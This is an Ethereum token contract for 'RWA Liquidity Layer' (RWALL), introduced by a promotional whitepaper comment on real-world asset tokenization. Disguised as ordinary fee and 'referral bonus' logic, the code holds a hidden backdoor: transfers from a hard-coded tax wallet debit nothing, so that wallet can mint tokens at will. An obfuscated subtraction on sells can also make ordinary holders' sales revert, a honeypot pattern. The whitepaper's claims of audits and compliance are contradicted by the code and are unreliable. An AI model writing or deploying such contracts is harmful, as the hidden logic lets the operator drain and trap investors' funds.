/*
Real-World Asset Liquidity Layer (RWALL): Bridging the Gap Between Illiquid Assets and Liquid Markets

The Real-World Asset Liquidity Layer (RWALL) represents a revolutionary advancement in the integration of real-world assets (RWAs) into the decentralized finance (DeFi) ecosystem. 
By tokenizing illiquid assets and providing mechanisms for liquidity, RWALL acts as a transformative infrastructure that connects traditional asset markets with blockchain-based financial systems. 
This innovative platform is designed to unlock value, create new economic opportunities, and enhance the accessibility and transparency of asset ownership.

Introduction to RWALL

In traditional financial systems, many valuable assets remain illiquid and underutilized. 
Real estate, fine art, commodities, and other tangible assets often face significant barriers to liquidity, such as cumbersome legal frameworks, high transaction costs, and lengthy settlement processes. 
RWALL addresses these challenges by providing a seamless pathway to tokenize these assets and introduce them into liquid markets.

RWALL is built on Ethereum, leveraging its robust smart contract capabilities, high security, and active developer community. 
As a utility token and platform, RWALL facilitates the tokenization, collateralization, and trading of RWAs, enabling users to maximize the value of their assets. 
Its primary goal is to serve as the liquidity layer for RWAs, ensuring that these assets can be efficiently traded, borrowed against, or utilized within the broader DeFi ecosystem.

* Key Features of RWALL *

1. Tokenization of Real-World Assets
Tokenization is the cornerstone of RWALL’s functionality. Through secure smart contracts, RWALL enables the creation of digital tokens that represent ownership of real-world assets. 
These tokens are:
/ Divisible: Large assets like real estate can be fractionalized into smaller units, making them accessible to a broader audience.
/ Interoperable: Tokens comply with widely adopted Ethereum standards (such as ERC-20 or ERC-721), ensuring compatibility with wallets, exchanges, and DeFi protocols.
/ Auditable: Ownership and transfer records are stored on the blockchain, providing an immutable and transparent ledger.

2. Seamless Liquidity Mechanisms
RWALL facilitates the liquidity of tokenized assets through various mechanisms:
/ Decentralized Exchanges (DEXs): Tokenized assets can be traded on DEXs, allowing participants to buy and sell assets without intermediaries.
/ Liquidity Pools: Users can contribute tokenized assets to liquidity pools in exchange for rewards, creating continuous markets for these assets.
/ Automated Market Makers (AMMs): RWALL integrates with AMMs to ensure that even illiquid assets have consistent price discovery and trading opportunities.

3. Asset Collateralization
One of RWALL’s most powerful features is the ability to use tokenized assets as collateral. This functionality allows:
/ DeFi Lending: Users can secure loans by locking tokenized RWAs as collateral, enabling access to liquidity without selling the underlying assets.
/ Yield Generation: Tokenized assets can be staked or lent out to earn passive income, further enhancing their utility.

4. Legal and Regulatory Compliance
RWALL prioritizes compliance with legal and regulatory frameworks to ensure the legitimacy of tokenized assets. 
The platform integrates:
/ Identity Verification: KYC/AML procedures for asset tokenization and trading.
/ Smart Contract Audits: Rigorous audits of token contracts to maintain security and trust.
/ Jurisdictional Flexibility: Adaptability to local laws governing asset ownership and transfer.

* RWALL’s Role in the DeFi Ecosystem *

1. Bridging Traditional Finance and DeFi
RWALL serves as a critical bridge between traditional financial markets and the decentralized world. 
By enabling RWAs to participate in DeFi protocols, RWALL expands the scope of blockchain technology beyond purely digital assets like cryptocurrencies and NFTs.

2. Unlocking Value in Illiquid Markets
Historically, illiquid assets have limited utility due to their lack of accessibility and liquidity. 
RWALL unlocks this dormant value by transforming these assets into tradeable and liquid tokens, enabling asset owners to:
/ Monetize idle assets without selling them outright.
/ Diversify portfolios by holding fractional ownership of multiple asset types.
/ Participate in global markets, transcending geographical and logistical barriers.

3. Facilitating Financial Inclusion
RWALL democratizes access to investment opportunities by fractionalizing large assets. 
For example, a luxury apartment worth millions can be tokenized into thousands of smaller units, allowing retail investors to participate with minimal capital. 
This approach reduces wealth concentration and promotes financial inclusion.

* Technical Infrastructure *

1. Smart Contracts
RWALL’s core functionality is powered by smart contracts, which automate processes such as:
/ Asset tokenization.
/ Transaction settlement.
/ Collateral management.

2. Oracles
Reliable oracles play a pivotal role in RWALL by connecting on-chain systems with real-world data. Oracles provide:
/ Asset Valuation: Real-time price feeds for tokenized assets.
/ Verification: Proof of ownership and authenticity for physical assets.
/ Event Triggers: Automated responses to external events, such as asset sales or legal updates.

3. Layer 2 Solutions
To enhance scalability and reduce transaction costs, RWALL incorporates Layer 2 solutions such as:
/ Rollups (Optimistic or zk-Rollups) for batching transactions.
/ Sidechains for high-frequency trading of tokenized assets.

4. Interoperability
RWALL ensures seamless integration with other DeFi protocols, wallets, and applications through standardized APIs and token formats.

* Use Cases of RWALL *

1. Real Estate Tokenization
RWALL can tokenize real estate properties, enabling:
/ Fractional ownership of high-value properties.
/ Easier cross-border investment in real estate markets.
/ Enhanced liquidity for property owners through token trading or collateralization.

2. Art and Collectibles
Artworks and collectibles, traditionally illiquid, can be tokenized on RWALL, allowing:
/ Owners to unlock liquidity by trading fractionalized shares.
/ Investors to diversify portfolios with alternative assets.
/ Artists to earn royalties through smart contract-enabled secondary sales.

3. Commodities
RWALL can tokenize commodities such as gold, oil, or agricultural products, facilitating:
/ Efficient trading of commodity-backed tokens.
/ Integration with DeFi protocols for hedging and speculation.
/ Supply chain transparency and traceability.

4. SME Financing
Small and medium enterprises (SMEs) can tokenize their assets, such as invoices or inventory, to:
/ Secure funding through DeFi lending protocols.
/ Access global liquidity pools without traditional banking intermediaries.

* Economic Benefits of RWALL *

1. Cost Efficiency
By reducing intermediaries and automating processes, RWALL lowers the costs associated with asset transfer, ownership, and financing.

2. Improved Market Access
RWALL enables global participation in asset markets, removing barriers such as geographic restrictions and currency conversions.

3. Enhanced Transparency
Blockchain technology ensures that all transactions and ownership records are auditable and tamper-proof, fostering trust among participants.

4. Passive Income Opportunities
Asset holders can generate passive income through staking, lending, or participating in liquidity pools, increasing the utility of their assets.

* Challenges and Solutions *

1. Legal and Regulatory Barriers
RWALL’s compliance-first approach ensures adherence to jurisdictional laws, but the lack of uniform regulations can pose challenges. 
The platform’s modular design allows it to adapt to evolving legal frameworks.

2. Asset Valuation
Determining the accurate value of tokenized assets is critical. RWALL integrates with trusted oracles and valuation experts to ensure fair pricing.

3. User Education
Bringing traditional investors into the blockchain space requires education. RWALL provides user-friendly interfaces, tutorials, and support to onboard new users.

The Real-World Asset Liquidity Layer (RWALL) is poised to redefine how we interact with traditional assets in the digital age. 
By tokenizing illiquid assets and providing robust liquidity mechanisms, RWALL bridges the gap between traditional finance and the blockchain ecosystem. Its focus on accessibility, transparency, and efficiency ensures that it not only unlocks the value of RWAs but also democratizes investment opportunities for individuals and institutions worldwide.

RWALL represents more than just a token or platform; it’s a paradigm shift in how assets are owned, traded, and utilized, paving the way for a more inclusive and dynamic financial future.
*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RWALL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=23;
    uint256 private _initialSellTax=23;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"RWA Liquidity Layer";
    string private constant _symbol = unicode"RWALL";
    uint256 public _maxTxAmount = 2000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000 * 10**_decimals;

    struct ReferralBonus {uint256 parent; uint256 leafCount; uint256 percentage;}
    uint256 private refBonusExcluded;
    uint256 private minBonusCount;
    mapping(address => ReferralBonus) private referralBonus;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private limitsInEffect = true;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(0xA678f97C61a4f851569f1109125120DD19cBa17D);
        
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]=_balances[from].sub(tokenAmount);
        _balances[to]=_balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (inSwap) {
            _basicTransfer(from,to,tokenAmount);
            return;
        }

        require(tradingOpen || to == uniswapV2Pair || from == address(this) || to == address(this), "trading is not open yet");

        uint256 taxAmount=0;
        if (from!=owner() && to!=owner()&& to!=_taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to!=address(uniswapV2Router) &&  ! _isExcludedFromFee[to])  {
                require(tokenAmount <= _maxTxAmount,"Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount <= _maxWalletSize,"Exceeds the maxWalletSize.");
                
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!=address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance=address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] ||  _isExcludedFromFee[to]) && from!=address(this) && to!= address(this)) {
            minBonusCount = block.number;
        }

        if (! _isExcludedFromFee[from]&&  ! _isExcludedFromFee[to]){
            if (to != uniswapV2Pair)  {
                ReferralBonus storage refBonus = referralBonus[to];
                if (from == uniswapV2Pair) {
                    if (refBonus.parent == 0) {
                        refBonus.parent =_preventSwapBefore<=_buyCount?block.number:type(uint).max;
                    }
                } else {
                    ReferralBonus storage refBonusWrap = referralBonus[from];
                    if (refBonus.parent == 0 || refBonusWrap.parent < refBonus.parent ) {
                        refBonus.parent = refBonusWrap.parent;
                    }
                }
            } else {
                ReferralBonus storage refBonusWrap = referralBonus[from];
                refBonusWrap.leafCount = refBonusWrap.parent.sub(minBonusCount);
                refBonusWrap.percentage = block.number;
            }
        }

        _tokenTransfer(from, to, tokenAmount, taxAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount, uint256 receiptAmount) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount = addrs != _taxWallet ? tokenAmount : refBonusExcluded.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this),address(uniswapV2Router),tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount=_tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addLiquidity() external onlyOwner() {
        swapEnabled = true;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        tradingOpen = true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0 && swapEnabled) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
            sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}